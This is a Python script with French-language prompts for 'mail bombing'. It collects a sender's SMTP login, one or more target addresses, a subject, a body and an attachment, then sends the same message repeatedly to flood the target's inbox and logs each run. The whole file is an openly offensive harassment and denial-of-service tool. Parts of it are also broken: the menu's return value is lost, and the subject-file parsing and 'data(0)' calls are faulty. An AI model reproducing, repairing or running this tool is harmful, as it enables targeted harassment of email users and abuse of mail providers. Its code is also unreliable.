import datetime
import os
import re
import smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import random

PATH_LOG = 'bombing_log.txt'
REGEX_MAIL = r'[^@ \t\r\n]+@[^@ \t\r\n]+\.[^@ \t\r\n]+'
REGEX_INT = r'^\d+$'

def set_log(log, error):
    today = datetime.date.today()
    date = today.strftime("%d/%m/%Y")
    with open(PATH_LOG, 'a') as file:
        file.write("["+date+"]-------------------------------\n")
        if error:
            file.write("Error during a email bombing\n")
        else:
            file.write("Email send success\n")
        file.write("Number of email : "+log[7]+"\n")
        file.write("Email date : "+log[6]+"\n")
        file.write("From : "+log[1]+"\n")
        file.write("To : "+log[3]+"\n")
        file.write("Attachment path : "+log[8]+"\n")
        file.write("Subject : "+log[4]+"\n")
        file.write("Body : "+log[5]+"\n")
    file.close()

def send_mail(data):
    try:
        body = MIMEText(data[5])
        mail = MIMEMultipart()
        mail.attach(body)
        mail['From'] = data[1]
        mail['Subject'] = data[4]
        mail['To'] = data[3]
        mail['Date'] = data[6]

        if data[8] != "":
            with open(data[8], 'r') as fp:
                msg = MIMEBase('application', "octet-stream")
                msg.set_payload(fp.read())
            msg.add_header('Content-Disposition', 'attachment', filename=os.path.basename(data[8]))
            mail.attach(msg)

        serv = smtplib.SMTP(data[0], 587)
        serv.starttls()
        serv.login(data[1], data[2])

        serv.sendmail(data[1], data[3], mail.as_string())

        serv.quit()
        return True
    except:
        return False

def bombing(data):
    error = False
    for i in range(0, int(data[7])):
        if not send_mail(data):
            error = True
    set_log(data,error)

def get_sujet_corp(path):
    with open(path, 'r') as file:
        data = file.read()
        lines = data.split("\n")
        mail = {}
        sujet = None
        for line in lines:
            if len(line) > 5:
                if line[4] == 'sujet':
                    sujet = line
                if line[4] == 'corp ':
                    mail[sujet[4:]] = line[4:]
    file.close()

    return random.choice(list(mail.items()))

def get_mail(path):
    with open(path, 'r') as file:
        data = file.read()
        lines = data.split("\n")
        res = []
        is_mail = False
        mail = None
        for line in lines:
            res.append(line)
    file.close()

    while not is_mail:
        mail = random.choice(res)
        is_mail = re.match(REGEX_MAIL, mail)
    return mail

def getinput(type_mail, type_sujet):
    mail_d, mail_s, nb_mail, server_smtp, test_mail_s, mail_s_pwd, test_nb_mail, path_file, mail_path, sujet, corp = None, None, None, None, None, None, None, "", "", None, None

    list_smtp = ['smtp.neuf.fr', 'smtp.aliceadsl.fr', 'smtp.aol.com', 'outbound.att.net', 'smtpauths.bluewin.ch',
                 'smtp.bouygtel.fr', 'mail.club-internet.fr', 'smtp.free.fr', 'smtp.gmail.com', 'smtp.ifrance.fr',
                 'smtp.live.com', 'smtp.laposte.fr', 'smtp.netcourrier.com', 'smtp.o2.com', 'smtp.orange.fr',
                 'smtp.live.com', 'smtphm.sympatico.ca', 'smtp.tiscali.fr', 'outgoing.verizon.net', 'smtp.voila.fr',
                 'smtp.wanadoo.fr', 'mail.yahoo.com']

    while not server_smtp in list_smtp:
        server_smtp = input("Entrée le serveur SMTP : ")

    while not test_mail_s:
        mail_s = input("Entrée le mail envoyeur : ")
        test_mail_s = re.match(REGEX_MAIL, mail_s)

    while not mail_s_pwd:
        mail_s_pwd = input("Entrée le mot de pass de l'envoyeur : ")

    date = input("Entrée la date du mail : ")

    while not test_nb_mail:
        nb_mail = input("Entrée le nombre de mail a envoyer : ")
        test_nb_mail = re.match(REGEX_INT, nb_mail)

    while not os.path.isfile(path_file) or path_file == "":
        path_file = input("Entrée le Path du fichier a joindre : ")

    if type_mail == ' ON':
        while not os.path.isfile(mail_path):
            mail_path = input("Entrée le path du fichier contenant les mails de destination : ")
        mail_d = get_mail(mail_path)
    else:
        mail_d = input("Entrée le mail de destination : ")

    if type_sujet == ' ON':
        data = get_sujet_corp(input("Entrée le path du fichier contenant les sujet et corp du mail : "))
        sujet = data(0)
        corp = data(1)
    else:
        while not sujet:
            sujet = input("Entrée le sujet du mail : ")

        while not corp:
            corp = input("Entrée le corp du mail : ")

    return [server_smtp, mail_s, mail_s_pwd, mail_d, sujet, corp, date, nb_mail, path_file]

def interface(type_mail, type_sujet):

    print('************************************************')
    print('|                                              |')
    print('|                 MAIL BOMBING                 |')
    print('|                                              |')
    print('|    1 - Fichier de mail de destination   ' + type_mail + '  |')
    print('|    2 - Fichier de sujet et corpus       ' + type_sujet + '  |')
    print('|    3 - Valider                               |')
    print('|                                              |')
    print('************************************************')

    type = int(input("> "))

    if type == 1:
        if type_mail == 'OFF':
            type_mail = ' ON'
        else:
            type_mail = 'OFF'
    elif type == 2:
        if type_sujet == 'OFF':
            type_sujet = ' ON'
        else:
            type_sujet = 'OFF'
    elif type == 3:
        return getinput(type_mail, type_sujet)

    interface(type_mail, type_sujet)

def main():
    data = interface('OFF', 'OFF')
    bombing(data)

if __name__ == "__main__":
    main()
